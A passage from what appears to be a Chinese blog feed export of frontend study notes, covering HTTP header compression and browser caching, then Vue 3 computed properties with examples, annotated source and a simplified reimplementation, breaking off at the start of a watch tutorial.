<h2 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306301927115.webp"></p>
<ul>
<li>维护一份相同的静态字典，包含常见的头部名称，以及常见的头部名称和值的组合，取头部信息时通过索引取，比较快</li>
<li>维护一份相同的动态字典，可以动态的添加内容</li>
<li>通过静态Huffman编码对传输的首部字段进行编码</li>
</ul>
<h2 id="客户端缓存"><a href="#客户端缓存" class="headerlink" title="客户端缓存"></a>客户端缓存</h2><h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>通过服务器来判断缓存是否可用</p>
<h4 id="Last-Modify"><a href="#Last-Modify" class="headerlink" title="Last-Modify"></a>Last-Modify</h4><p>搭配If-Modify-Since</p>
<p>浏览器第一次请求一个资源的时候，服务器返回的header中会加上Last-Modify，该资源的最后修改时间</p>
<p>当浏览器再次请求该资源时，request的请求头中会包含If-Modify-Since（Last-Modify的值）</p>
<p>服务器收到If-Modify-Since后，根据资源的最后修改时间判断是否命中缓存</p>
<h4 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h4><p>搭配If-None-Match</p>
<p>web服务器响应请求时，会在header中加一个ETag，用于告诉浏览器，当前资源在服务器的唯一标识（生成规则由服务器决定）</p>
<p>再次向web服务器请求时，会带上头If-None-Match（Etag的值）</p>
<p>web服务器收到请求后将If-None-Match与ETag进行比对，决定是否命中缓存</p>
<h4 id="ETag和Last-Modified的区别"><a href="#ETag和Last-Modified的区别" class="headerlink" title="ETag和Last-Modified的区别"></a>ETag和Last-Modified的区别</h4><ul>
<li>在精度上，ETag要优于Last-Modified：Last-Modified的时间单位是秒，如果某个文件在1秒内改变了多次，那么他们的Last-Modified其实并没有体现出修改，但是ETag每次都会改变确保了精度</li>
<li>在性能上，ETag要逊于Last-Modified，因为Last-Modified只需要记录时间，而ETag需要服务器通过算法来计算出一个hash值，更耗时</li>
<li>在优先级上，服务器校验优先考虑ETag，如果服务器收到的请求没有ETag值，则验证Last-Modified</li>
</ul>
<p>两种方式都是命中协商缓存时，返回304；不一致则返回新校验值（ETag或Last-Modified）和文件，并返回200</p>
<h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><ul>
<li>Expires：值为绝对时间，但它是HTTP1.0的东西，现在默认浏览器均默认使用HTTP1.1</li>
<li>Cache-Control：值为相对时间，如果与Expires同时设置的话，其优先级高于Expires，有几个常用属性<ul>
<li>-max-age：设置失效时间，客户端在这个有效期内，如果又请求该资源，就直接读取缓存</li>
<li>-no-cache：不使用本地缓存，需要使用协商缓存，过程见上</li>
<li>-no-store：禁止浏览器缓存数据，每次用户请求该资源，都会向服务器发送一个请求</li>
<li>-public：可以被所有的用户缓存，包括终端用户和CDN等中间代理服务器</li>
<li>-private：只能被终端用户的浏览器缓存，不允许CDN等中继缓存服务器对其缓存</li>
</ul>
</li>
</ul>
<p>服务器通过设置HTTP中header的Expires和Cache-Control字段告诉浏览器缓存的有效期</p>
<p>强缓存会有一个固定时间，但如果服务器数据进行了更新，却还没到强缓存的过期时间，则数据无法更新</p>
<p>Cache-Control的优先级比Expires高</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>computed计算属性</title>
    <url>/web/study/Vue/10.computed%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="computed用法"><a href="#computed用法" class="headerlink" title="computed用法"></a>computed用法</h1><p>当依赖的属性的值发生变化时，会触发它自身的更改。</p>
<p>依赖的值不发生变化时，使用的是缓存中的属性值。</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      姓：&lt;input v-model=&quot;firstName&quot; type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      名：&lt;input v-model=&quot;lastName&quot; type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      全名：&#123;&#123; name &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button @click=&quot;changeName&quot;&gt;changeName&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, computed &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">let firstName = ref(&quot;李&quot;)</span><br><span class="line">let lastName = ref(&quot;田所&quot;)</span><br><span class="line"></span><br><span class="line">const changeName = ()=&gt; &#123;</span><br><span class="line">  // 使用函数式写法的话，name.value就是只读的</span><br><span class="line">  name.value = &quot;田所-浩二&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 选项式写法，支持一个对象传入get函数和set函数自定义操作</span><br><span class="line">let name = computed&lt;string&gt;(&#123;</span><br><span class="line">  get() &#123;</span><br><span class="line">    return firstName.value + &quot;-&quot; + lastName.value</span><br><span class="line">  &#125;,</span><br><span class="line">  set(newVal: string) &#123;</span><br><span class="line">    // 解构赋值</span><br><span class="line">    [firstName.value, lastName.value] = newVal.split(&quot;-&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 函数式写法，只能支持一个getter函数，不允许修改值</span><br><span class="line">// let name = computed(()=&gt; &#123;</span><br><span class="line">//   return firstName.value + &quot;-&quot; + lastName.value</span><br><span class="line">// &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="模拟案例"><a href="#模拟案例" class="headerlink" title="模拟案例"></a>模拟案例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;input v-model=&quot;keyWord&quot; placeholder=&quot;搜索&quot; type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;margin-top: 20px;&quot;&gt;</span><br><span class="line">      &lt;table border width=&quot;600&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;</span><br><span class="line">        &lt;thead&gt;</span><br><span class="line">          &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;名称&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;单价&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;数量&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;总价&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">          &lt;/tr&gt;</span><br><span class="line">        &lt;/thead&gt;</span><br><span class="line">        &lt;tbody&gt;</span><br><span class="line">          &lt;!-- &lt;tr v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot;&gt; --&gt;</span><br><span class="line">          &lt;tr v-for=&quot;(item, index) in searchData&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;&#123; item.name &#125;&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;&#123; item.price &#125;&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;</span><br><span class="line">              &lt;button @click=&quot;sub(item)&quot;&gt;-&lt;/button&gt;</span><br><span class="line">              &#123;&#123; item.num &#125;&#125;</span><br><span class="line">              &lt;button @click=&quot;add(item)&quot;&gt;+&lt;/button&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&#123;&#123; item.num*item.price &#125;&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td align=&quot;center&quot;&gt;&lt;button @click=&quot;del(index)&quot;&gt;删除&lt;/button&gt;&lt;/td&gt;</span><br><span class="line">          &lt;/tr&gt;</span><br><span class="line">        &lt;/tbody&gt;</span><br><span class="line">        &lt;tfoot&gt;</span><br><span class="line">          &lt;tr&gt;</span><br><span class="line">            &lt;td colspan=&quot;5&quot; align=&quot;right&quot;&gt;</span><br><span class="line">              &lt;!-- 总价：&#123;&#123; $total &#125;&#125; --&gt;</span><br><span class="line">              总价：&#123;&#123; total &#125;&#125;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">          &lt;/tr&gt;</span><br><span class="line">        &lt;/tfoot&gt;</span><br><span class="line">      &lt;/table&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, computed, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">interface Data &#123;</span><br><span class="line">  name: string,</span><br><span class="line">  price: number,</span><br><span class="line">  num: number,</span><br><span class="line">&#125;</span><br><span class="line">let keyWord = ref&lt;string&gt;(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">let data = reactive&lt;Data[]&gt;([</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;KNN&quot;,</span><br><span class="line">    price: 114,</span><br><span class="line">    num: 1,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;SNNN&quot;,</span><br><span class="line">    price: 514,</span><br><span class="line">    num: 1,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;YJSP&quot;,</span><br><span class="line">    price: 1919,</span><br><span class="line">    num: 1,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;RU&quot;,</span><br><span class="line">    price: 810,</span><br><span class="line">    num: 1,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;BNKRG&quot;,</span><br><span class="line">    price: 364,</span><br><span class="line">    num: 1,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: &quot;YMN&quot;,</span><br><span class="line">    price: 364,</span><br><span class="line">    num: 1,</span><br><span class="line">  &#125;,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">// 使用函数方式计算总价</span><br><span class="line">// let $total = ref&lt;number&gt;(0)</span><br><span class="line">// const total = ()=&gt; &#123;</span><br><span class="line">//   $total.value = data.reduce((prev: number, next: Data)=&gt; &#123;</span><br><span class="line">//     return prev+next.num*next.price</span><br><span class="line">//   &#125;, 0)</span><br><span class="line">// &#125;</span><br><span class="line">// 程序开始时、物品数量增删改时，都要调用这个函数，很麻烦</span><br><span class="line">// total()</span><br><span class="line"></span><br><span class="line">// 使用computed就很省心了</span><br><span class="line">const total = computed(()=&gt; &#123;</span><br><span class="line">  return data.reduce((prev: number, next: Data)=&gt; &#123;</span><br><span class="line">    return prev+next.num*next.price</span><br><span class="line">  &#125;, 0)</span><br><span class="line">&#125;)</span><br><span class="line">// 还可与用来过滤数据</span><br><span class="line">const searchData = computed(()=&gt; &#123;</span><br><span class="line">  return data.filter((item:Data)=&gt; &#123;</span><br><span class="line">    return item.name.includes(keyWord.value)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const sub = (item: Data)=&gt; &#123;</span><br><span class="line">  // return item.num&gt;1?(item.num--,total()):null</span><br><span class="line">  return item.num&gt;1?item.num--:null</span><br><span class="line">&#125;</span><br><span class="line">const add = (item: Data)=&gt; &#123;</span><br><span class="line">  // return item.num&lt;99?(item.num++,total()):null</span><br><span class="line">  return item.num&lt;99?item.num++:null</span><br><span class="line">&#125;</span><br><span class="line">const del = (index: number)=&gt; &#123;</span><br><span class="line">  data.splice(index,1)</span><br><span class="line">  // total()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/reactivity/src/computed.ts</code>）中可以看到computed的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数重载，支持多种传参</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> computed&lt;T&gt;(</span><br><span class="line">  <span class="attr">getter</span>: <span class="title class_">ComputedGetter</span>&lt;T&gt;,</span><br><span class="line">  debugOptions?: <span class="title class_">DebuggerOptions</span></span><br><span class="line">): <span class="title class_">ComputedRef</span>&lt;T&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> computed&lt;T&gt;(</span><br><span class="line">  <span class="attr">options</span>: <span class="title class_">WritableComputedOptions</span>&lt;T&gt;,</span><br><span class="line">  debugOptions?: <span class="title class_">DebuggerOptions</span></span><br><span class="line">): <span class="title class_">WritableComputedRef</span>&lt;T&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> computed&lt;T&gt;(</span><br><span class="line">  <span class="attr">getterOrOptions</span>: <span class="title class_">ComputedGetter</span>&lt;T&gt; | <span class="title class_">WritableComputedOptions</span>&lt;T&gt;,</span><br><span class="line">  debugOptions?: <span class="title class_">DebuggerOptions</span>,</span><br><span class="line">  isSSR = <span class="literal">false</span></span><br><span class="line">) &#123;</span><br><span class="line">  <span class="comment">// 格式化参数</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">getter</span>: <span class="title class_">ComputedGetter</span>&lt;T&gt;</span><br><span class="line">  <span class="keyword">let</span> <span class="attr">setter</span>: <span class="title class_">ComputedSetter</span>&lt;T&gt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果传来的是函数，那么这个computed是只读的</span></span><br><span class="line">  <span class="keyword">const</span> onlyGetter = <span class="title function_">isFunction</span>(getterOrOptions)</span><br><span class="line">  <span class="keyword">if</span> (onlyGetter) &#123;</span><br><span class="line">    <span class="comment">// 传入的函数赋给getter</span></span><br><span class="line">    getter = getterOrOptions</span><br><span class="line">    <span class="comment">// 不能设置值，否则报错</span></span><br><span class="line">    setter = __DEV__</span><br><span class="line">      ? <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;Write operation failed: computed value is readonly&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="variable constant_">NOOP</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果是选项，就可以进行读取、设置值</span></span><br><span class="line">    getter = getterOrOptions.<span class="property">get</span></span><br><span class="line">    setter = getterOrOptions.<span class="property">set</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> cRef = <span class="keyword">new</span> <span class="title class_">ComputedRefImpl</span>(getter, setter, onlyGetter || !setter, isSSR)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__DEV__ &amp;&amp; debugOptions &amp;&amp; !isSSR) &#123;</span><br><span class="line">    cRef.<span class="property">effect</span>.<span class="property">onTrack</span> = debugOptions.<span class="property">onTrack</span></span><br><span class="line">    cRef.<span class="property">effect</span>.<span class="property">onTrigger</span> = debugOptions.<span class="property">onTrigger</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cRef <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">ComputedRefImpl</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">public</span> dep?: <span class="title class_">Dep</span> = <span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> _value!: T</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">readonly</span> <span class="attr">effect</span>: <span class="title class_">ReactiveEffect</span>&lt;T&gt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">readonly</span> __v_isRef = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">readonly</span> [<span class="title class_">ReactiveFlags</span>.<span class="property">IS_READONLY</span>]: <span class="built_in">boolean</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 是否是需要重新计算的脏值</span></span><br><span class="line">  <span class="comment">// 如果依赖值没有发生变化，就会使用缓存中的值，这个特性就是用脏值检测实现的</span></span><br><span class="line">  <span class="keyword">public</span> _dirty = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">public</span> <span class="attr">_cacheable</span>: <span class="built_in">boolean</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    getter: ComputedGetter&lt;T&gt;,</span></span><br><span class="line"><span class="params">    <span class="keyword">private</span> <span class="keyword">readonly</span> _setter: ComputedSetter&lt;T&gt;,</span></span><br><span class="line"><span class="params">    isReadonly: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    isSSR: <span class="built_in">boolean</span></span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 依赖不变这个不走</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">effect</span> = <span class="keyword">new</span> <span class="title class_">ReactiveEffect</span>(getter, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 调度函数scheduler</span></span><br><span class="line">      <span class="comment">// 只有依赖发生变化，并且脏值_dirty为false时，调度函数才会走</span></span><br><span class="line">      <span class="comment">// 初始化时的脏值_dirty是true，所以不会进来</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">_dirty</span>) &#123;</span><br><span class="line">        <span class="comment">// 把脏值_dirty变成true，说明依赖变化了，需要调用getter函数获取新值</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_dirty</span> = <span class="literal">true</span></span><br><span class="line">        <span class="title function_">triggerRefValue</span>(<span class="variable language_">this</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">effect</span>.<span class="property">computed</span> = <span class="variable language_">this</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">effect</span>.<span class="property">active</span> = <span class="variable language_">this</span>.<span class="property">_cacheable</span> = !isSSR</span><br><span class="line">    <span class="variable language_">this</span>[<span class="title class_">ReactiveFlags</span>.<span class="property">IS_READONLY</span>] = isReadonly</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// computed(()=&gt; &#123;</span></span><br><span class="line">  <span class="comment">// return a.xx + 10</span></span><br><span class="line">  <span class="comment">// &#125;)</span></span><br><span class="line">  <span class="comment">// 假设a.xx是5，那它返回的值就是15，effect.run()读取的值就是15</span></span><br><span class="line">  <span class="comment">// 如果a.xx变成6，ReactiveEffect就会走，它把脏值_dirty变成true，再调用一次effect.run()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 劫持value</span></span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">    <span class="comment">// the computed ref may get wrapped by other proxies e.g. readonly() #3376</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="title function_">toRaw</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="title function_">trackRefValue</span>(self)</span><br><span class="line">    <span class="comment">// 如果脏值_dirty是true，就重新计算</span></span><br><span class="line">    <span class="comment">// 如果值不变就不重新计算，直接返回上次计算出来的值（缓存在_value中）</span></span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">_dirty</span> || !self.<span class="property">_cacheable</span>) &#123;</span><br><span class="line">      self.<span class="property">_dirty</span> = <span class="literal">false</span>	<span class="comment">// 脏值_dirty设为false，所以它不脏了</span></span><br><span class="line">      self.<span class="property">_value</span> = self.<span class="property">effect</span>.<span class="title function_">run</span>()!	<span class="comment">// effect.run()用来读取getter函数的返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把函数的返回值赋给_value并return</span></span><br><span class="line">    <span class="keyword">return</span> self.<span class="property">_value</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">newValue: T</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">_setter</span>(newValue)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分位于<code>/package/reactivity/src/effect.ts</code></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ReactiveEffect类接收调度函数scheduler，此处省略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 会被trigger调用</span></span><br><span class="line"><span class="comment">// trigger在依赖更新时调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">triggerEffect</span>(<span class="params"></span></span><br><span class="line"><span class="params">  effect: ReactiveEffect,</span></span><br><span class="line"><span class="params">  debuggerEventExtraInfo?: DebuggerEventExtraInfo</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (effect !== activeEffect || effect.<span class="property">allowRecurse</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__DEV__ &amp;&amp; effect.<span class="property">onTrigger</span>) &#123;</span><br><span class="line">      effect.<span class="title function_">onTrigger</span>(<span class="title function_">extend</span>(&#123; effect &#125;, debuggerEventExtraInfo))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果有调度函数，调用</span></span><br><span class="line">    <span class="keyword">if</span> (effect.<span class="property">scheduler</span>) &#123;</span><br><span class="line">      effect.<span class="title function_">scheduler</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      effect.<span class="title function_">run</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="实现Computed"><a href="#实现Computed" class="headerlink" title="实现Computed"></a>实现Computed</h1><p><code>computed.ts</code>：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; effect &#125; <span class="keyword">from</span> <span class="string">&quot;./effect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">computed</span> = (<span class="params">getter: <span class="built_in">Function</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> _value = <span class="title function_">effect</span>(getter, &#123;</span><br><span class="line">    <span class="comment">// 因为它会在依赖更新时被调用，所以依赖更新时脏值被赋true</span></span><br><span class="line">    <span class="attr">scheduler</span>:<span class="function">()=&gt;</span>&#123;_dirty=<span class="literal">true</span>&#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 缓存值</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">catchValue</span>: <span class="built_in">any</span></span><br><span class="line">  <span class="keyword">let</span> _dirty = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">ComputedRefImpl</span> &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">      <span class="comment">// 如果脏值为true，更新</span></span><br><span class="line">      <span class="keyword">if</span>(_dirty) &#123;</span><br><span class="line">        catchValue = <span class="title function_">_value</span>()</span><br><span class="line">        _dirty = <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> catchValue</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ComputedRefImpl</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改上一节的<code>effect.ts</code>的部分内容：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加入一个effect选项接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Options</span> &#123;</span><br><span class="line">  scheduler?: <span class="title class_">Function</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改effect</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fn 匿名函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">effect</span> = (<span class="params">fn: <span class="built_in">Function</span>, options: Options</span>)=&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一个闭包</span></span><br><span class="line">  <span class="keyword">const</span> _effect = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    activeEffect = _effect</span><br><span class="line">    <span class="keyword">let</span> res = <span class="title function_">fn</span>()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把选项（这里主要是调度函数）赋给返回值_effect</span></span><br><span class="line">  _effect.<span class="property">options</span> = options</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化的时候调用一下</span></span><br><span class="line">  <span class="title function_">_effect</span>()</span><br><span class="line">  <span class="keyword">return</span> _effect</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改trigger</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> trigger = &lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt; <span class="function">(<span class="params">target: T, key: <span class="built_in">string</span> | <span class="built_in">symbol</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> depsMap = targetMap.<span class="title function_">get</span>(target)</span><br><span class="line">  <span class="keyword">if</span>(!depsMap) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;111&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> deps = depsMap.<span class="title function_">get</span>(key)</span><br><span class="line">  <span class="keyword">if</span>(!deps) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;222&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  deps.<span class="title function_">forEach</span>(<span class="function">(<span class="params">effect: <span class="built_in">any</span></span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 达到了每次依赖更新都会有则调用调度函数的效果</span></span><br><span class="line">    <span class="keyword">if</span>(effect?.<span class="property">options</span>?.<span class="property">scheduler</span>) &#123;</span><br><span class="line">      effect?.<span class="property">options</span>?.<span class="property">scheduler</span>?.()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">effect</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>watch侦听器</title>
    <url>/web/study/Vue/11.watch%E4%BE%A6%E5%90%AC%E5%99%A8.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h1><p>主要用来监听响应式数据（被ref或reactive包裹的数据）的变化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    case1: &lt;input v-model=&quot;message&quot; type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    case2: &lt;input v-model=&quot;message2&quot; type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    case3: &lt;input v-model=&quot;message3.foo.bar.baz.value&quot; type=&quot;text&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, reactive, watch &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const message = ref&lt;string&gt;(&quot;野兽先辈&quot;)</span><br><span class="line"></span><br><span class="line">const message2 = ref&lt;string&gt;(&quot;UDK姐贵&quot;)</span><br><span class="line"></span><br><span class="line">const message3 = reactive(&#123;</span><br><span class="line">  foo: &#123;</span><br><span class="line">    bar: &#123;</span><br><span class="line">      baz: &#123;</span><br><span class="line">        value: 